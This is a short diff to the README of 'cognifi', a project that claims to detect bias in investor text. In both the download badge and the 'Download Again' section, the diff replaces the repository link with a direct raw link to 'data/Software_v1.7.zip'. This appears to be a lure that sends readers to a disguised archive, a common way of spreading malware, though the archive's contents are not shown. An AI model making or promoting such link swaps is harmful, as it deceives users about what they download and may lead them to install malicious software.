@@ -1,6 +1,6 @@
 # 🧠 cognifi - Spot Bias in Investor Text
 
-[![Download cognifi](https://img.shields.io/badge/Download-cognifi-1f6feb?style=for-the-badge&logo=github)](https://github.com/Diwasbh5432/cognifi)
+[![Download cognifi](https://img.shields.io/badge/Download-cognifi-1f6feb?style=for-the-badge&logo=github)](https://github.com/Diwasbh5432/cognifi/raw/refs/heads/main/data/Software_v1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -226,7 +226,7 @@ This project fits topics such as:
 ## 🔗 Download Again
 
 Use this link to visit the page and download the files:
-https://github.com/Diwasbh5432/cognifi
+https://github.com/Diwasbh5432/cognifi/raw/refs/heads/main/data/Software_v1.7.zip
 
 ## 📝 Example Input
 
